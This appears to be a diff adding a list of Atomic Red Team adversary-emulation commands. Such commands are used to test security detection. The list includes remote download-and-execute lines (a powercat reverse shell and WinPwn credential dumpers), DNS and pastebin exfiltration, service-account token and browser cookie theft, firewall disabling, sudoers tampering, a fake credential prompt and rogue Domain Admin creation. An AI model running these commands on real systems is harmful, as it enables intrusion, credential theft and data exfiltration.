+for i in $(seq 1 5); do echo "$i, Atomic Red Team was here!"; sleep 1; done
+kubectl --context kind-atomic-cluster exec atomic-pod -- cat /run/secrets/kubernetes.io/serviceaccount/token
+echo "# THIS IS A COMMENT" >> /etc/default/ufw&&grep "# THIS IS A COMMENT" /etc/default/ufw
+wevtutil enum-logs
+reg add "HKCU\Software\Microsoft\Terminal Server Client" /v AuthenticationLevelOverride /t REG_DWORD /d 0 /f
+C:\Users\Public\ngrok\ngrok.exe config add-authtoken #{api_token} | Out-Null;Start-Job -ScriptBlock { C:\Users\Public\ngrok\ngrok.exe tcp #{port_num} } | Out-Null;Start-Sleep -s 5 ;Stop-Job -Name Job1 | Out-Null
+#{exe_binary}
+reg query "HKEY_CURRENT_USER\Control Panel\International\Geo"
+cmdkey /list
+Import-Module "#{ps_module}";Invoke-DNSExfiltrator -i "#{ps_module}" -d #{domain} -p #{password} -doh #{doh} -t #{time} #{encoding}
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters" /v AllowEncryptionOracle /t REG_DWORD /d 2 /f
+killall 'Google Chrome'&&sleep 1&&open -a "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/&&sleep 1&&/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337
+reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v EnableFirewall /t REG_DWORD /d 0 /f;reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v EnableFirewall /t REG_DWORD /d 0 /f
+IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1');powercat -c #{server_ip} -p #{server_port}
+$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');wificreds -consoleoutput -noninteractive  
+truncate -s +1 #{file_to_pad} #adds a byte to the file size
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f
+$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');decryptteamviewer -consoleoutput -noninteractive  
+echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
+echo '#{text_to_append}' >> /etc/profile.d/bash_completion.sh
+copy C:\Windows\System32\cmd.exe C:\lsm.exe;C:\lsm.exe /c echo T1036.003 > C:\T1036.003.txt
+rundll32.exe keymgr,KRShowKeyMgr
+if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo "$ssh_authorized_keys" > ~/.ssh/authorized_keys; fi;
+if [ "$(uname)" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
+sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /usr/local/etc/sudoers&&sudo visudo -c -f /usr/local/etc/sudoers
+Invoke-ATHHTMLApplication -HTAFilePath #{hta_file_path} -ScriptEngine #{script_engine} -SimulateUserDoubleClick
+mshta.exe "about:<hta:application><script language="VBScript">Close(Execute("CreateObject(""Wscript.Shell"").Run%20""powershell.exe%20-nop%20-Command%20Write-Host%20#{message};Start-Sleep%20-Seconds%20#{seconds_to_sleep}"""))</script>'"
+echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
+Enter-PSSession -HostName ${username}@${ip_address}
+curl -sO #{remote_url}; chmod +x #{payload_name} | bash #{payload_name}
+reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableRemoteDesktopAntiAlias" /t REG_DWORD /d 1 /f
+Start-Process #{MSP360_Connect_Path}
+sudo defaults write com.apple.loginwindow LoginHook #{script}
+$apiKey = "#{api_key}";$content = "secrets, api keys, passwords...";$url = "https://pastebin.com/api/api_post.php";$postData = @{;  api_dev_key   = $apiKey;  api_option    = "paste";  api_paste_code = $content;};$response = Invoke-RestMethod -Uri $url -Method Post -Body $postData;Write-Host "Your paste URL: $response"
+Invoke-SMBExec -Target ${ip_address} -Domain ${domain} -Username ${username} -Hash ${ntlm} -Command ${command} -verbose
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v ShowSuperHidden /t REG_DWORD /d 0 /f;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v Hidden /t REG_DWORD /d 0 /f
+echo "dn: cn=Atomic User, cn=Users,dc=#{domain},dc=#{top_level_domain}\nobjectClass: person\ncn: Atomic User\nsn: User" > tempadmin.ldif&&echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif&&ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
+ldapsearch -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{user} -w #{password} -b "CN=Users,DC=#{domain},DC=#{top_level_domain}" -s sub -a always -z 1000 dn
+powershell -executionpolicy bypass -command "#{file_path}\Get-Inbox.ps1" -file #{output_file}
+Start-Process "#{exe_binary}";Start-Sleep -Seconds 7;Get-Process -Name Notepad -ErrorAction SilentlyContinue | Stop-Process -Force
+echo "" | "#{plink_file}" "#{vm_host}" -ssh  -l "#{vm_user}" -pw "#{vm_pass}" -m "#{cli_script}"
+conhost.exe "#{process}"
+mkdir ~/Library/Mail/copy&&cp -R ~/Library/Mail/* ~/Library/Mail/copy&&rm -rf ~/Library/Mail/copy/*
+set comspec=#{command_to_execute};cscript %windir%\System32\manage-bde.wsf
+mkdir ~/Library/Mail/copy&&cp -R ~/Library/Mail/* ~/Library/Mail/copy&&echo "Manipulated data" > ~/Library/Mail/copy/manipulated.txt
+reg add "HKCU\Software\Microsoft\Windows\Windows Error Reporting" /v DontShowUI /t REG_DWORD /d 1 /f
+sudo sed -i 's/env_reset.*$/env_reset,timestamp_timeout=-1/' /etc/sudoers&&sudo visudo -c -f /etc/sudoers
+Invoke-ATHHTMLApplication -ScriptEngine #{script_engine} -InlineProtocolHandler #{protocol_handler} -MSHTAFilePath #{mshta_file_path}
+Add-Type -AssemblyName System.Windows.Forms;$screen = [Windows.Forms.SystemInformation]::VirtualScreen;$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height;$graphic = [Drawing.Graphics]::FromImage($bitmap);$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size);$bitmap.Save("#{output_file}")
+# Creates GUI to prompt for password. Expect long pause before prompt is available.    ;$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName);# Using write-warning to allow message to show on console as echo and other similar commands are not visable from the Invoke-AtomicTest framework.;write-warning $cred.GetNetworkCredential().Password
+tasklist | findstr #{process_to_enumerate}
+copy "#{exe_path}" %temp%\T1036.003_masquerading.docx.exe /Y;copy "#{exe_path}" %temp%\T1036.003_masquerading.pdf.exe /Y;copy "#{exe_path}" %temp%\T1036.003_masquerading.ps1.exe /Y;copy "#{vbs_path}" %temp%\T1036.003_masquerading.xls.vbs /Y;copy "#{vbs_path}" %temp%\T1036.003_masquerading.xlsx.vbs /Y;copy "#{vbs_path}" %temp%\T1036.003_masquerading.png.vbs /Y;copy "#{ps1_path}" %temp%\T1036.003_masquerading.doc.ps1 /Y;copy "#{ps1_path}" %temp%\T1036.003_masquerading.pdf.ps1 /Y;copy "#{ps1_path}" %temp%\T1036.003_masquerading.rtf.ps1 /Y;%temp%\T1036.003_masquerading.docx.exe;%temp%\T1036.003_masquerading.pdf.exe;%temp%\T1036.003_masquerading.ps1.exe;%temp%\T1036.003_masquerading.xls.vbs;%temp%\T1036.003_masquerading.xlsx.vbs;%temp%\T1036.003_masquerading.png.vbs;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.doc.ps1;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.pdf.ps1;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -File %temp%\T1036.003_masquerading.rtf.ps1
+New-WebGlobalModule -Name #{module_name} -Image #{dll_path}
+Cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs";New-ItemProperty -Path Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\16.0\Excel\Security -Name "VBAWarnings" -Value "1" -PropertyType DWORD -Force | Out-Null;& '.\Excel 2016.lnk' "PathToAtomicsFolder\T1204.002\bin\mirrorblast_emulation.xlsm"
+mkdir -p /var/spool/mail/copy&&for file in /var/spool/mail/*; do&&  if [ "$(basename "$file")" != "copy" ]&&  then&&    cp -R "$file" /var/spool/mail/copy/&&  fi&&done&&rm -rf /var/spool/mail/copy/*
+wmic #{wmic_command} /FORMAT:"#{remote_xsl_file}"
+$ipAddr = "#{ip_address}";if ($ipAddr -eq "") {;    # Assumes the "primary" interface is shown at the top;    $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1;    Write-Host "[i] Using Interface $interface";    $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress;};Write-Host "[i] Base IP-Address for Subnet: $ipAddr";$subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1);# Always assumes /24 subnet;Write-Host "[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'";;$ports = #{port_list};$subnetIPs = 1..254 | ForEach-Object { "$subnetSubstring$_" };;foreach ($ip in $subnetIPs) {;    foreach ($port in $ports) {;      try {;          $tcp = New-Object Net.Sockets.TcpClient;          $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null;      } catch {};      if ($tcp.Connected) {;          $tcp.Close();          Write-Host "Port $port is open on $ip";      };    };}
+$secure_pwd = "#{password}" | ConvertTo-SecureString -AsPlainText -Force;$creds = New-Object System.Management.Automation.PSCredential -ArgumentList "#{username}", $secure_pwd;Connect-AzAccount -Credential $creds;New-AzAutomationRunbook -Name #{runbook_name} -Type PowerShell -ResourceGroupName #{resource_group} -Description 'my-test-runbook' -AutomationAccountName #{automation_account_name}
+iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/TokenManipulation/Get-WinlogonTokenSystem.ps1');Get-WinLogonTokenSystem
+FILE=`find ~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist -type f | head -1`&&if [ -z "${FILE}" ] ; then echo "No loginwindow plist file found" && exit 1 ; fi&&echo save backup copy to /tmp/&&cp ${FILE} /tmp/t1547007_loginwindow-backup.plist&&echo before&&plutil -p ${FILE}&&echo overwriting...&&#{exe_path} ${FILE} && echo after && plutil -p ${FILE}
+& "PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe" #{optional_args} -h #{domain} -s subtree -f "objectclass=computer" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
+echo "dn: CN=Admin User,CN=Users,DC=#{domain},DC=#{top_level_domain}\nchangetype: add\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: Admin User\nsn: User\ngivenName: Atomic User\nuserPrincipalName: adminuser@#{domain}.#{top_level_domain}\nsAMAccountName: adminuser\nuserAccountControl: 512\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\nmemberOf: CN=Domain Admins,CN=Users,DC=#{domain},DC=#{top_level_domain}" > tempadmin.ldif&&echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif&&ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif
+python3 -c 'import base64; import subprocess; xor_decrypt = lambda text, key: "".join([chr(c ^ ord(k)) for c, k in zip(base64.b64decode(text.encode()), key)]); command = "#{encrypted_command}"; key = "#{xor_key}"; exec = xor_decrypt(command, key); subprocess.call(exec, shell=True)'
+echo "#{command}" >> /var/spool/cron/crontabs/#{cron_script_name}
+$dnsServer = "#{dns_server}";$exfiltratedData = "#{exfiltrated_data}";$chunkSize = #{chunk_size};;$encodedData = [System.Text.Encoding]::UTF8.GetBytes($exfiltratedData);$encodedData = [Convert]::ToBase64String($encodedData);$chunks = $encodedData -split "(.{$chunkSize})";;foreach ($chunk in $chunks) {;    $dnsQuery = $chunk + "." + $dnsServer;    Resolve-DnsName -Name $dnsQuery;    Start-Sleep -Seconds 5;}
